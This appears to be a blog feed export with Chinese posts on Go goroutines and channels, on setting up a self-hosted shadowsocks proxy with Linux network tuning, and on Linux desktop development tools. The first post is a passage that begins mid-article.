<p>现在的Linux和Windows都是分时复用的多任务操作系统，上面跑着很多程序，所以操作系统需要在不同进程之间切换，这时候就产生了CPU上下文切换，具体技术细节咱可以不了解，但是存在的问题就是切换的时候非常消耗资源，默认情况下Linux只可以创建1024个进程，虽然可以修改，但是一旦进程或线程数过多，CPU的时间基本上都浪费在上下文切换上面了，何谈高效？</p>
<p>可见，多进程和多线程并不是很完美，对于编程来说，难度非常大，所以目前只有Java有比较好的多线程模型，PHP虽然有相关扩展，但是很少有人使用，JS压根不支持！</p>
<p>但是并不是必须使用多进程或多线程才可以实现高并发，很多时候，特别是web相关应用，当你读取文件或者调用API都会产生IO，但是由于计算机硬盘、网络传输速度比较慢，CPU就会一直在那等…时间就浪费了！后来有人想，既然在等IO，你就把CPU让出来让其它人用啊，当硬盘数据读取到、接口返回数据的时候我通知你一声就行了，这就是异步非阻塞IO，JS目前使用就是这种模型，Golang的协程也会用到。</p>
<p>在我理解，go的协程是为了解决多核CPU利用率问题，go语言层面并不支持多进程或多线程，但是协程更好用，协程被称为用户态线程，不存在CPU上下文切换问题，效率非常高。</p>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><h3 id="1-Hello-World"><a href="#1-Hello-World" class="headerlink" title="1.Hello World"></a>1.Hello World</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">go</span> say(<span class="string">"Hello World"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">say</span><span class="params">(s <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">    <span class="built_in">println</span>(s)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>go启动协程的方式就是使用关键字go，后面一般接一个函数或者匿名函数，但是如果你运行上面第一段代码，你会发现什么结果都没有，what？？？</p>
<p>这至少说明你代码写的没问题，当你使用go启动协程之后,后面没有代码了，这时候主线程结束了，这个协程还没来得及执行就结束了… 聪明的小伙伴会想到，那我主线程先睡眠1s等一等？ Yes, 在main代码块最后一行加入：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">time.Sleep(time.Second*<span class="number">1</span>) # 表示睡眠<span class="number">1</span>s</span><br></pre></td></tr></table></figure>
<p>再次运行，打印出Hello World，1s后程序终止！</p>
<h3 id="2-WaitGroup"><a href="#2-WaitGroup" class="headerlink" title="2.WaitGroup"></a>2.WaitGroup</h3><p>上面睡眠这种做法肯定是不靠谱的，WaitGroup可以解决这个问题, 代码如下:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"sync"</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">var</span> wg = sync.WaitGroup&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    wg.Add(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">go</span> say(<span class="string">"Hello World"</span>)</span><br><span class="line">    wg.Wait()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">say</span><span class="params">(s <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">    <span class="built_in">println</span>(s)</span><br><span class="line">    wg.Done()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>简单说明一下用法，var 是声明了一个全局变量 wg，类型是sync.WaitGroup，wg.add(1) 是说我有1个协程需要执行，wg.Done 相当于 wg.Add(-1) 意思就是我这个协程执行完了。wg.Wait() 就是告诉主线程要等一下，等协程都执行完再退出。</p>
<h3 id="3-并发还并行"><a href="#3-并发还并行" class="headerlink" title="3.并发还并行?"></a>3.并发还并行?</h3><p>当你同时启动多个协程的时候，会怎么执行呢？</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"strconv"</span></span><br><span class="line">    <span class="string">"sync"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wg = sync.WaitGroup&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    wg.Add(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">5</span>; i++ &#123;</span><br><span class="line">        <span class="keyword">go</span> say(<span class="string">"Hello World: "</span> + strconv.Itoa(i))</span><br><span class="line">    &#125;</span><br><span class="line">    wg.Wait()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">say</span><span class="params">(s <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">    <span class="built_in">println</span>(s)</span><br><span class="line">    wg.Done()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果去掉go，直接在循环里面调用这个函数5次，毫无疑问会一次输出 Hello World: 0 ~ 4, 但是在协程里面，输出的顺序是无序的，看上去像是“同时执行”，其实这只是并发。</p>
<p>有一个问题，上面的例子里面是并发还并行呢？</p>
<p>首先，我们得区分什么是并发什么是并行，举个比较熟悉的例子，并发就是一个锅同时炒2个菜，2个菜来回切换，并行就是你有多个锅，每个锅炒不同的菜，多个锅同时炒！</p>
<p>对于计算机来说，这个锅就是CPU，单核CPU同一时间只能执行一个程序，但是CPU却可以在不同程序之间快速切换，所以你在浏览网页的同时还可以听歌！但是多核CPU就不一样了，操作系统可以一个CPU核心用来浏览网页，另一个CPU核心拿来听歌，所以多核CPU还是有用的。</p>
<p>但是对于单一程序来说，基本上是很难利用多核CPU的，主要是编程实现非常麻烦，这也是为什么很多人都说多核CPU是一核有难多核围观…特别是一些比较老的程序，人家在设计的时候压根没考虑到多核CPU，毕竟10年前CPU还没有这么多核心。</p>
<p>回到上面的例子，如果当前CPU是单核，那么上面程序就是并发执行，如果当前CPU是多核，那就是并行执行，结果都是一样的，如何证明请看下面的例子：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"runtime"</span></span><br><span class="line">    <span class="string">"strconv"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    runtime.GOMAXPROCS(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">5</span>; i++ &#123;</span><br><span class="line">        <span class="keyword">go</span> say(<span class="string">"Hello World: "</span> + strconv.Itoa(i))</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">say</span><span class="params">(s <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">    <span class="built_in">println</span>(s)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>默认情况下，最新的go版本协程可以利用多核CPU，但是通过runtime.GOMAXPROCS() 我们可以设置所需的核心数（其实并不是CPU核心数），在上面的例子我们设置为1，也就是模拟单核CPU，运行这段程序你会发现无任何输出，如果你改成2，你会发现可以正常输出。</p>
<p>这段程序逻辑很简单，使用一个for循环启动5个协程，然后写了一个for死循环，如果是单核CPU，当运行到for死循环的时候，由于没有任何io操作（或者能让出CPU的操作），会一直卡在那里，但是如果是多核CPU，go协程就会调用其它CPU去执行。</p>
<p>如果你在for循环里面加入一个sleep操作，比如下面这样：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">    time.Sleep(time.Second)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行上面代码，你会发现居然可以正常输出，多次运行你会发现其结果一直是从0到4，变成顺序执行了！这也说明单核CPU只能并发，不能并行！</p>
<h3 id="4-channel"><a href="#4-channel" class="headerlink" title="4.channel"></a>4.channel</h3><p>channel，又叫管道，在go里面的管道是协程之间通信的渠道，类似于咱们常用的消息队列。在上面的例子里面我们是直接打印出来结果，假如现在的需求是把输出结果返回到主线程呢？</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"strconv"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> result = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">string</span>)</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">5</span>; i++ &#123;</span><br><span class="line">        <span class="keyword">go</span> say(<span class="string">"Hello World: "</span>+strconv.Itoa(i), result)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> s := <span class="keyword">range</span> result &#123;</span><br><span class="line">        <span class="built_in">println</span>(s)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">say</span><span class="params">(s <span class="keyword">string</span>, c <span class="keyword">chan</span> <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">    c &lt;- s</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>简单说明一下，这里就是实例化了一个string类型的管道，在调用函数的时候会把管道当作参数传递过去，然后在调用函数里面我们不输出结果，然后把结果通过管道返还回去，然后再主线程里面我们通过for range循环依次取出结果！</p>
<p>结果如下，但是这个程序是有bug的，在程序的运行的最后会出现一个fatal error，提示所有的协程都进入睡眠状态，死锁！</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hello World: 4</span><br><span class="line">Hello World: 1</span><br><span class="line">Hello World: 0</span><br><span class="line">Hello World: 2</span><br><span class="line">Hello World: 3</span><br><span class="line">fatal error: all goroutines are asleep - deadlock!</span><br></pre></td></tr></table></figure>
<p>go的管道默认是阻塞的(假如你不设置缓存的话)，你那边放一个，我这头才能取一个，如果你那边放了东西这边没人取，程序就会一直等下去，死锁了，同时，如果那边没人放东西，你这边取也取不到，也会发生死锁！</p>
<p>如何解决这个问题呢？标准的做法是主动关闭管道，或者你知道你应该什么时候关闭管道, 当然你结束程序管道自然也会关掉！针对上面的演示代码，可以这样写：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> s := <span class="keyword">range</span> result &#123;</span><br><span class="line">    <span class="built_in">println</span>(s)</span><br><span class="line">    <span class="keyword">if</span> i &gt;= <span class="number">4</span> &#123;</span><br><span class="line">        <span class="built_in">close</span>(result)</span><br><span class="line">    &#125;</span><br><span class="line">    i++</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为我们明确知道总共会输出5个结果，所以这里简单做了一个判断，大于5就关闭管道退出for循环，就不会报错了！虽然丑了点，但是能用</p>
<h3 id="5-生产者消费者模型"><a href="#5-生产者消费者模型" class="headerlink" title="5.生产者消费者模型"></a>5.生产者消费者模型</h3><p>利用channel和协程，我们可以非常容易的实现了一个生产者消费者模型，代码如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"strconv"</span></span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">    <span class="string">"time"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    ch1 := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>)</span><br><span class="line">    ch2 := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">string</span>)</span><br><span class="line">    <span class="keyword">go</span> pump1(ch1)</span><br><span class="line">    <span class="keyword">go</span> pump2(ch2)</span><br><span class="line">    <span class="keyword">go</span> suck(ch1, ch2)</span><br><span class="line">    time.Sleep(time.Duration(time.Second*<span class="number">30</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">pump1</span><span class="params">(ch <span class="keyword">chan</span> <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; ; i++ &#123;</span><br><span class="line">        ch &lt;- i * <span class="number">2</span></span><br><span class="line">        time.Sleep(time.Duration(time.Second))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">pump2</span><span class="params">(ch <span class="keyword">chan</span> <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; ; i++ &#123;</span><br><span class="line">        ch &lt;- strconv.Itoa(i+<span class="number">5</span>)</span><br><span class="line">        time.Sleep(time.Duration(time.Second))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">suck</span><span class="params">(ch1 <span class="keyword">chan</span> <span class="keyword">int</span>, ch2 <span class="keyword">chan</span> <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">    chRate := time.Tick(time.Duration(time.Second*<span class="number">5</span>)) <span class="comment">// 定时器</span></span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        <span class="keyword">select</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> v := &lt;-ch1:</span><br><span class="line">            fmt.Printf(<span class="string">"Received on channel 1: %d\n"</span>, v)</span><br><span class="line">        <span class="keyword">case</span> v := &lt;-ch2:</span><br><span class="line">            fmt.Printf(<span class="string">"Received on channel 2: %s\n"</span>, v)</span><br><span class="line">        <span class="keyword">case</span> &lt;-chRate:</span><br><span class="line">            fmt.Printf(<span class="string">"Log log...\n"</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出结果如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Received on channel 1: 0</span><br><span class="line">Received on channel 2: 5</span><br><span class="line">Received on channel 2: 6</span><br><span class="line">Received on channel 1: 2</span><br><span class="line">Received on channel 1: 4</span><br><span class="line">Received on channel 2: 7</span><br><span class="line">Received on channel 1: 6</span><br><span class="line">Received on channel 2: 8</span><br><span class="line">Received on channel 2: 9</span><br><span class="line">Received on channel 1: 8</span><br><span class="line">Log log...</span><br><span class="line">Received on channel 2: 10</span><br><span class="line">Received on channel 1: 10</span><br><span class="line">Received on channel 1: 12</span><br><span class="line">Received on channel 2: 11</span><br><span class="line">Received on channel 2: 12</span><br><span class="line">Received on channel 1: 14</span><br></pre></td></tr></table></figure>
<p>这个程序建立了2个管道一个传输int，一个传输string，同时启动了3个协程，前2个协程非常简单，就是每隔1s向管道输出数据，第三个协程是不停的从管道取数据，和之前的例子不一样的地方是，pump1 和 pump2是2个不同的管道，通过select可以实现在不同管道之间切换，哪个管道有数据就从哪个管道里面取数据，如果都没数据就等着，还有一个定时器功能可以每隔一段时间向管道输出内容！而且我们可以很容易启动多个消费者。</p>
<h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><h3 id="1-Web应用"><a href="#1-Web应用" class="headerlink" title="1.Web应用"></a>1.Web应用</h3><p>使用go自带的http库几行代码就可以启动一个http server，代码如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">http.HandleFunc(<span class="string">"/"</span>, <span class="function"><span class="keyword">func</span><span class="params">(writer http.ResponseWriter, request *http.Request)</span></span> &#123;</span><br><span class="line">        _, _ = fmt.Fprintln(writer, <span class="string">"Hello World"</span>)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">_ = http.ListenAndServe(<span class="string">"127.0.0.1:8080"</span>, <span class="literal">nil</span>)</span><br></pre></td></tr></table></figure>
<p>虽然简单，但是非常高效，因为其底层使用了go协程，对于每一个请求都会启动一个协程去处理，所以并发可以轻轻松松达到上万QPS。</p>
<h3 id="2-并发编程"><a href="#2-并发编程" class="headerlink" title="2.并发编程"></a>2.并发编程</h3><p>举一个非常简单的例子，假设我们在业务里面需要从3个不同的数据库获取数据，每次耗时100ms，正常写法就是从上到下依次执行，总耗时300ms，但是使用协程这3个操作可以“同时”进行，耗时大大减少。</p>
<p>几乎所有IO密集型的应用，都可以利用协程提高速度，提高程序并发能力，不必把CPU时间浪费在等待的过程中，同时还可以充分利用多核CPU的计算能力。</p>
]]></content>
      <categories>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>自建梯子访问Google等学术网站</title>
    <url>/2018/linux/custom-google-tz.html</url>
    <content><![CDATA[<p>这个话题有点敏感，但是我首先说明一下，此处只做一个记录，网上类似的文章超级多，而且我纯粹是拿来上Google学习用，搞web开发的应该没几个不用Chrome的，Chrome配上Google账号同步简直完美。</p>
<a id="more"></a>

<h2 id="1-首先，你得有一个国外的服务器"><a href="#1-首先，你得有一个国外的服务器" class="headerlink" title="1.首先，你得有一个国外的服务器"></a>1.首先，你得有一个国外的服务器</h2><p>购买国外服务器的途径很多，比如阿里云就有很多国外的主机，缺点是较贵，并且感觉不安全，你们懂的。还有比如说亚马逊云等云服务器商也可以买到国外主机。还有一些国外vps主机也可以。</p>
<p>国外的主机相对来说便宜点，比如vultr的vps最便宜的3.5美元一个月，单核，512M，500G流量，搭梯子绰绰有余，除非你一天到晚看YouTube，不然正常浏览网页，我一个月10G都用不完。国外主机的缺点就是英文，而且很多要求使用信用卡支付，比较麻烦。（现在vultr已经支持支付宝和微信支付）</p>
<p>至于各个服务器哪个好哪个坏我就不评论了，用的不多，但是我可以给大家一个选择标准:</p>
<h3 id="1-地理位置"><a href="#1-地理位置" class="headerlink" title="1.地理位置"></a>1.地理位置</h3><p>如果你只是自己用，你肯定得选个离自己近的主机，比如常见的日本的适合北方，香港的适合南方，当然美国的就稍微远点</p>
<h3 id="2-ping值"><a href="#2-ping值" class="headerlink" title="2.ping值"></a>2.ping值</h3><p>拿到主机先ping一下，有很多vps的ip已经被ban掉了，还有的丢包严重，或者延迟特别大，比如说美国洛杉矶的主机一般延迟在200ms左右，纽约稍微高点，日本的大概100ms左右，其实吧，这些影响都不大，毕竟你是拿来上网页，又不是打游戏，对ping要求不高。</p>
<p>然后你可以试着在vps上面放一个文件，下载试试，测试一下带宽</p>
<p>一般来说，由于中国的地域广阔，各个地方的宽带都不一样，有电信网通，还有乱七八糟的小宽带，适合别人的不一定适合你的，所以适合自己的最好！</p>
<h2 id="2-安装shadowsocks"><a href="#2-安装shadowsocks" class="headerlink" title="2.安装shadowsocks"></a>2.安装shadowsocks</h2><p>首先，大家都这个软件得有一个概念，这个软件是一款支持端对端加密的代理软件，所以他有2个端，一个是服务器端，另一个是客户端，这里只说服务器端。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install python-pip python-setuptools</span><br><span class="line">pip install git+https:&#x2F;&#x2F;github.com&#x2F;shadowsocks&#x2F;shadowsocks.git@master</span><br></pre></td></tr></table></figure>
<p>这2条命令就可以搞定安装，<a href="https://github.com/shadowsocks/shadowsocks.git" target="_blank" rel="noopener">https://github.com/shadowsocks/shadowsocks.git</a> 是这个项目的github地址，有兴趣的可以去看看，上面也有安装文档。</p>
<h2 id="3-配置shadowsocks"><a href="#3-配置shadowsocks" class="headerlink" title="3.配置shadowsocks"></a>3.配置shadowsocks</h2><p>如果上面的安装没有报错，那么在安装完成后，应该会有2个命令可以用，一个是sslocal，一个是ssserver。sslocal其实是客户端用的，但是现在很多客户端都是GUI的，github上面有各个平台的客户端可以下载安装使用。</p>
<p>ssserver 才是服务器端会用到的, 有兴趣的可以help一下，这里直接说一个最简单用法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssserver -p 443 -k password -m aes-256-cfb</span><br></pre></td></tr></table></figure>
<p>上面命令的意思是在服务器的443端口启动一个shadowsocks，并且密码是password，加密方式是aes-256-cfb</p>
<p>但是实际应用里面，一般的都是多端口多密码，这样可以给很多人用，比如你的同事朋友，不过这里建议大家不要拿去售卖盈利哦，据说有被抓的，自己用用就行了！</p>
<p>新建一个文件 shadowsocks.json</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;server&quot;:&quot;45.xx.12.xx&quot;,</span><br><span class="line">    &quot;local_address&quot;:&quot;127.0.0.1&quot;,</span><br><span class="line">    &quot;local_port&quot;:1080,</span><br><span class="line">    &quot;port_password&quot;: &#123;</span><br><span class="line">        &quot;5555&quot;: &quot;12345678&quot;,</span><br><span class="line">        &quot;6666&quot;: &quot;87654321&quot;,</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;method&quot;: &quot;aes-128-cfb&quot;,</span><br><span class="line">    &quot;timeout&quot;: 600,</span><br><span class="line">    &quot;fast_open&quot;:true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后使用命令<code>ssserver -c shadowsocks.json</code>就可以启动多端口多密码配置，其中 port_password 就是端口和对应的密码，其它参数比如 method 是加密方式，这个随意，比如aes 256 理论上比128安全点，但是消耗性能，timeout是超时时间，不要太短</p>
<p>简单说一下客户端咋使用，一般shadowsocks的客户端都需要填服务器ip，服务器端口，服务器密码，加密方式，本地绑定ip，本地端口，其实就是这个配置文件里面的东西，前4个肯定是必须有，最后2个不一定。</p>
<h2 id="4-服务器优化"><a href="#4-服务器优化" class="headerlink" title="4.服务器优化"></a>4.服务器优化</h2><h3 id="1-BBR"><a href="#1-BBR" class="headerlink" title="1.BBR"></a>1.BBR</h3><p>这个是Google的发明的tcp新的拥堵算法，对网络协议了解的人应该知道拥堵算法，简单说这个BBR对于弱网的情况下有一定的加速效果，比较适合网络查的情况下，我觉得应该有一定作用，大家可以试试！</p>
<p>开启BBR的需要比较新的内核，据说是必须大于4.9,uname -r 可以查看，如果不是则需要手动安装最新的内核，不过一般vps的Linux版本都比较新，反正我是没遇到这种情况，我一般用Ubuntu 16.04 或者18.04。</p>
<p>执行 <code>lsmod | grep bbr</code>，如果结果中没有 tcp_bbr 的话就先执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">modprobe tcp_bbr</span><br><span class="line">echo &quot;tcp_bbr&quot; | sudo tee --append &#x2F;etc&#x2F;modules-load.d&#x2F;modules.conf</span><br></pre></td></tr></table></figure>
<p>然后在执行:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;net.core.default_qdisc&#x3D;fq&quot; | sudo tee --append &#x2F;etc&#x2F;sysctl.conf</span><br><span class="line">echo &quot;net.ipv4.tcp_congestion_control&#x3D;bbr&quot; | sudo tee --append &#x2F;etc&#x2F;sysctl.conf</span><br></pre></td></tr></table></figure>
<p>保存生效:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sysctl -p</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sysctl net.ipv4.tcp_available_congestion_control</span><br><span class="line">sysctl net.ipv4.tcp_congestion_control</span><br></pre></td></tr></table></figure>
<p>如果结果都有 bbr, 则证明你的内核已开启 bbr</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@vultr:~# lsmod | grep bbr</span><br><span class="line">tcp_bbr                20480  31</span><br></pre></td></tr></table></figure>

<h3 id="2-调整Linux网络配置"><a href="#2-调整Linux网络配置" class="headerlink" title="2.调整Linux网络配置"></a>2.调整Linux网络配置</h3><p>编辑 /etc/sysctl.conf 文件，加入以下配置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fs.file-max &#x3D; 51200</span><br><span class="line">net.core.rmem_max &#x3D; 67108864</span><br><span class="line">net.core.wmem_max &#x3D; 67108864</span><br><span class="line">net.core.netdev_max_backlog &#x3D; 250000</span><br><span class="line">net.core.somaxconn &#x3D; 4096</span><br><span class="line">net.ipv4.tcp_syncookies &#x3D; 1</span><br><span class="line">net.ipv4.tcp_tw_reuse &#x3D; 1</span><br><span class="line">net.ipv4.tcp_tw_recycle &#x3D; 0</span><br><span class="line">net.ipv4.tcp_fin_timeout &#x3D; 30</span><br><span class="line">net.ipv4.tcp_keepalive_time &#x3D; 1200</span><br><span class="line">net.ipv4.ip_local_port_range &#x3D; 10000 65000</span><br><span class="line">net.ipv4.tcp_max_syn_backlog &#x3D; 8192</span><br><span class="line">net.ipv4.tcp_max_tw_buckets &#x3D; 5000</span><br><span class="line">net.ipv4.tcp_fastopen &#x3D; 3</span><br><span class="line">net.ipv4.tcp_mem &#x3D; 25600 51200 102400</span><br><span class="line">net.ipv4.tcp_rmem &#x3D; 4096 87380 67108864</span><br><span class="line">net.ipv4.tcp_wmem &#x3D; 4096 65536 67108864</span><br><span class="line">net.ipv4.tcp_mtu_probing &#x3D; 1</span><br></pre></td></tr></table></figure>
<p>保存，然后<code>sysctl -p</code></p>
<p>最后再说一点，为了方便重启，大家可以搞一个开机自启脚本把启动shadowsocks的命令写里面，或者简单点直接使用 supervisor，这里贴一个supervisor的配置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[program:shadowsocks]</span><br><span class="line">autorestart&#x3D;true</span><br><span class="line">autostart&#x3D;true</span><br><span class="line">redirect_stderr&#x3D;true</span><br><span class="line">command&#x3D;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;ssserver -c &#x2F;root&#x2F;shadowsocks.json</span><br><span class="line">user&#x3D;root</span><br><span class="line">stdout_logfile&#x3D;&#x2F;var&#x2F;log&#x2F;shadowsocks.log</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Google</tag>
      </tags>
  </entry>
  <entry>
    <title>闲谈Linux桌面系统下常用工具</title>
    <url>/2018/linux/linux-tools-software.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>作为一个编程开发人员，Linux操作系统的诞生就是一个传奇故事，如今Linux内核系统更是遍布在咱们日常生活中各种电子设备，比如智能路由器（openWrt）、安卓手机（Android）、服务器。。。而Linux桌面系统的使用率其实也不低，尤其在国外，毕竟Linux开源免费，而国内由于Windows盗版横行，用Linux的相对来说少一点！</p>
<p>本人使用了一年多的Ubuntu和Mint桌面发行版，主要做PHP开发，今天来谈谈自己经常用的工具，欢迎大家点评！</p>
<a id="more"></a>

<h2 id="一、开发工具篇"><a href="#一、开发工具篇" class="headerlink" title="一、开发工具篇"></a>一、开发工具篇</h2><p>这估计是大家最关心的，毕竟用Linux的大多还是搞编程的程序员，一般人我还真不建议使用Linux，而这方面Linux绝对够用！由于不同语言使用的IDE不同，我说说我自己使用过的。</p>
<h3 id="1-JetBrains-全家桶"><a href="#1-JetBrains-全家桶" class="headerlink" title="1.JetBrains 全家桶"></a>1.JetBrains 全家桶</h3><img src="/images/old/3571187-2dd1696efe7b0182.png"/> 

<p>有人说，此工具一出，此篇终结，没啥说的了。。。因为这个全家桶支持很多语言，C/C++、Java、Ruby、Python、Php、JavaScript、Go、Mysql、.Net 差不多囊括了常见的编程语言了吧？JetBrains系列都是基于JRE，也就是跨平台的，功能十分丰富，还可以安装插件，缺点就是运行速度相对比较慢（毕竟是Java虚拟机），大家可以去其官网看看，如果有钱可以买正版支持一下！</p>
<h3 id="2-Atom-Sublime-Text"><a href="#2-Atom-Sublime-Text" class="headerlink" title="2.Atom/Sublime Text"></a>2.Atom/Sublime Text</h3><p>轻量级的文本编辑器，适合各种编程语言，速度快，安装插件之后功能也非常丰富，然而Sublime的Linux版本有致命缺陷，无法输入中文（搜狗输入法），民间有解决方案。Atom是完全开源免费的，功能也很多丰富，关键是可以完美输入中文！</p>
<h3 id="3-数据库管理"><a href="#3-数据库管理" class="headerlink" title="3.数据库管理"></a>3.数据库管理</h3><p>我经常用的有Navicat，Windows下面的估计大家都用过，Linux下的是Wine版本，基本功能都有，挺方便。还有一个MySQL Workbench也不错，也有很多人喜欢用phpmyadmin。</p>
<h3 id="4-Remarkable"><a href="#4-Remarkable" class="headerlink" title="4.Remarkable"></a>4.Remarkable</h3><p>一款MarkDown编辑器，经常写MarkDown可以试试。</p>
<h3 id="5-Vi-Vim"><a href="#5-Vi-Vim" class="headerlink" title="5.Vi/Vim"></a>5.Vi/Vim</h3><p>这个难度有点高，我也就是偶尔原来修改个配置啥滴，想把vim玩溜那得花不少功夫，据说还有一个上古神器Emacs，从来没有见过身边有人用过。。。不过只要你肯折腾，配置好用起来也就很溜的哦。</p>
<h3 id="6-Visual-Studio-Code"><a href="#6-Visual-Studio-Code" class="headerlink" title="6.Visual Studio Code"></a>6.Visual Studio Code</h3><p>最近才发现的一个编辑器，界面看上去和Atom有点像，功能非常强大，微软出品，适合写C/C++</p>
